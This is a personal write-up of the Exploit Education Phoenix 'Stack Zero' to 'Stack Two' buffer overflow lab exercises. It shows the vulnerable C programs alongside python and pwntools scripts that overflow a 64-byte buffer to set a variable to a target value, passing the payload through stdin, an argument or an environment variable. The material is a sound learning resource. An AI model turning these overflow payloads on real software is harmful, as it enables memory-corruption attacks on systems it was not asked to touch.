# Buffer Overflow

In C, a buffer is an area of memory set aside for the temporary storage of data. A buffer overflow is when an input to a buffer exceeds the original intended buffer area, overwriting other program information, thus making the program behave unexpectedly. In CTFs, I have seen two main types of overflows: overflowing the buffer, and overflowing the buffer and writing an address for the system to return to. I will be using the https://exploit.education/phoenix/ Stack series to learn how to do buffer overflows. This is just my write-ups for me to come back later on, if needed. I will also use this as an opportunity for myself to learn how to properly use `pwntools` as well.

## Stack Zero

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

Here, we can see that the buffer is set to 64: `char buffer[64];` In addition, we see the system uses `gets`, which is a vulnerable function, as it allows us to input more information than the buffer can hold, allowing for overflow. To write 64 characters in python, we can just do the following command: `python3 -c 'print("A"*64)'`. This outputs 64 "A"'s. However, the buffer is 64 and we need to write more than 64 bytes in order to conduct a buffer overflow. Thus, we run the following: `python3 -c 'print("A"*65)'`. This gives us the following output in the code:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed!
```

We have then overflowed the `locals.changeme` variable. 

## Stack One

This process is similar to the aforementioned, however, instead of any string, you put a hexadecimal string. 

```C
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```

If we add an extra `A` to the input from last time, we get the following:

```
./a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                
Getting closer! changeme is currently 0x00000041, we want 0x496c5962
```

So we are able to modify this value. The result we want is `0x496c5962`. 

> One thing to note, is that if we add an extra `B` to the end, we get `0x00004241`. This means that we have to use little endian for the solution. For example, if we used big endian, we would have `0x62596c49` (`0x496c5962` "backwards"), which is not what we want. If you want to learn more, look into endianness. 

I ended up writing the following code in Python 3 to solve this challenge:

```python
#!/usr/bin/python3
# Library import
from pwn import *
import subprocess

# The process
#elf = ELF("./a.out", checksec=True)
#p = process('./vulnerable_binary'); if not ELF
#p = elf.process()

# Context = Little vs Big Endian 
# For number 12 34, Big:0x12 0x34; Little:0x34 0x12
context(endian="little", log_level="debug")

#payload format using flat
#Helps to format strings better visually
payload = flat({
    64: p32(0x496c5962) #No need for quotes here; It basically cyclic fills until 64
})

binary = subprocess.run(["./a.out", payload]) #I use this because the file requires command line argument. Haven't figured that out yet using pwntools.
print(binary)
```

I have tried to add comments to the code to make it more explanatory. TLDR, I use flat to create a payload of 64 bytes of random characters, it then sends `0x496c5962` and limits it to 32 bytes (`p32()). From there, I use the subprocess library then add the payload as an argument to the binary.

With that, we get the flag:

```
Well done, you have successfully set changeme to the correct value
CompletedProcess(args=['./a.out', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaabYlI'], returncode=0)
```

After reading the write-up at https://github.com/secnate/Exploit-Education-CTFs/blob/main/Phoenix/stack-one/exploit.py, I realized that I could have added an argument using process. Here is a secondary solution:

```python
#!/usr/bin/python3
from pwn import *
import subprocess
context(endian="little", log_level="debug")
payload = flat({
    64: p32(0x496c5962) #No need for quotes here; It basically cyclic fills until 64
})
p = process(["./a.out", payload])
p.interactive()
```

## Stack Two

```
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

After compiling this code, I got an error: `a.out: please set the ExploitEducation environment variable`. This was fixed by running: `export ExploitEducation=1`. I spent a while trying to find out why my input was not changing the buffer, until I realized the input was meant to pass through the environment variable.

I was not aware of how to submit a environment variable using pwntools. I was able to learn from [this writeup](https://github.com/secnate/Exploit-Education-CTFs/blob/main/Phoenix/stack-two/exploit.py#L21). From there I learned to pass a variable through the process module. My solution to this ended up being:

```
from pwn import *
import subprocess
elf = ELF("./a.out", checksec=True)
context(endian="little", log_level="debug")
payload = flat({
    64: p32(0x0d0a090a) #No need for quotes here; It basically cyclic fills until 64
})
p = process(["./a.out"], env={"ExploitEducation" : payload })
p.interactive()
```

## Sources
- https://www.tutorialandexample.com/what-is-a-buffer-in-c
- https://exploit.education/phoenix/
- https://stackoverflow.com/questions/701624/difference-between-big-endian-and-little-endian-byte-order
- https://xanhacks.gitlab.io/ctf-docs/pwn/pwntools/